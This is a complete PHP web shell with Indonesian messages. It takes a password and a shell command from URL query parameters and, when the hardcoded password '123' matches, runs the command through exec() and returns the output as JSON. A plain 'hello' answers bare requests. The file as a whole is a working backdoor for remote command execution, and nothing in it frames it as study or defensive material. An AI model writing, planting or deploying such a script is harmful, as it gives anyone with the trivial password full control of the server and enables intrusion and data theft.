<?php

if($_GET){
    $pwd = $_GET['pwd'];
    $command = $_GET['cmd'];
    if($pwd == 123){
        $exec = exec($command,$output,$return);
        if($exec){
            // echo "Command berhasil"."<br>";
            // echo "<pre>".print_r($output,2)."</pre>";
            $result = json_encode($output);
            echo $result;

        }else{
            $result = json_encode("GAGAL");
            echo $result;
            // echo "Command gagal";
        }
    }else{
        $result = json_encode("Pasword Salah");
        echo $result;
    }
}else{
    echo "hello";
}



?>
